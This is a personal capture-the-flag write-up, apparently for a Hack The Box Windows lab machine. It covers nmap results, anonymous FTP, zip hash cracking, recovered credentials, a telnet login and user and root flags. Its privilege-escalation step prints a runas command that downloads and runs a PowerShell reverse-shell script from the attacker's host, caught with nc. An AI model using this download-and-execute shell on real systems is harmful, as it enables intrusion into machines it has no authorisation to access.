# Recon
Windows
Powershell

## Scan
```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  syn-ack ttl 127 Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
```

### 21 Microsoft ftpd
anonymous logins allowed
I stole a file called **Access Control.zip** but it's password protected with AES.
Dumped the hash for cracking `zip2john ac.zip > ac.hash` Coulnd't crack it.

### 23 telnet - encryption not supported


# Walkthrough
The DB found on FTP contained the password for the zip file, which was `access4u@security`
The email (**pst file**) contains credentials
`security`
`4Cc3ssC0ntr0ller`

## Use those credentials to telnet.
```
$ telnet -l security 10.10.10.98
```
We're in
![[0fab72d6b64341ed9bc4f90dddfbb2cf.png]]
user: `ff1f3b48913b213a31ff6756d2553d38`

## Privesc
Using **nishang** repo on github and this guide: https://0xdf.gitlab.io/2019/03/02/htb-access.html

### Webserver hosting Invoke-PowerShellTcp.ps1
![[b5552850860b421ca9d0079bd64a5f19.png]]
`runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.4:80/shell.ps1')"`
![[c8e353d85b784af0aa53dfdd10974873.png]]
nc catches reverse shell
![[adb429e488e44fd99c7f654a1dc692f8.png]]

root: `6e1586cc7ab230a8d297e8f933d904cf`